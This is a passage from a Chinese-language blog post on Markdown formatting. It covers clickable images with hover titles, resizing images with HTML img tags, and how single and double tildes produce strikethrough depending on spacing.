\"图片描述，当鼠标悬停会显示\")](网址)\n```\n\n如下图\n\n[![图片](https://upload-bbs.mihoyo.com/upload/2022/09/27/33087162/56c1464ae633055b7bb74bb3f924328a_3330391065587151535.png# \"好美\")](https://www.bh3.com/)\n\n但是这样图片就太大了，经过一顿百度，发现这东西还和具体的Markdown编辑器有关，不同的编辑器有不同的方式，但是我用的这种好像都不太可以，所以只能回归HTML了，HTML这样表示，可以调整大小，如下：\n\n```\n<img src=\"https://upload-bbs.mihoyo.com/upload/2022/09/27/33087162/56c1464ae633055b7bb74bb3f924328a_3330391065587151535.png\"  width=\"50%\" height=\"50%\" >   //也就是\n<img src=\"图片地址\" width=\" %\" hegiht=\" %\">\n```\n\n[<img src=\"https://upload-bbs.mihoyo.com/upload/2022/09/27/33087162/56c1464ae633055b7bb74bb3f924328a_3330391065587151535.png\" alt=\"好美\" width=\"50%\" height=\"50%\" >](https://www.bh3.com/)\n\n<p id=\"5\"></p>\n\n## 5.删除线问题\n\n今天在写总结的时候发现，删除线并不只是两个~就行，一个也行！？\n代码如下\n\n```\n~我是删除的~\n~ 我是删除的 ~\n~~我是删除的~~\n~~ 我是删除的 ~~\n~ ~ 我是删除的 ~ ~\n```\n\n而效果如下，立竿见影\n\n~我是删除的~\n~ 我是删除的 ~\n~~我是删除的~~\n~~ 我是删除的 ~~\n~ ~ 我是删除的 ~ ~\n\n总结：一个~也能用，但是**必须要贴合文字**，一旦有空格就无法显示删除线，两个 ~也是这样（看我这里打了个空格，不打的话就会和前面那个 ~遥相呼应，就会显示删除线，血泪的教训）","tags":["Markdown"]}]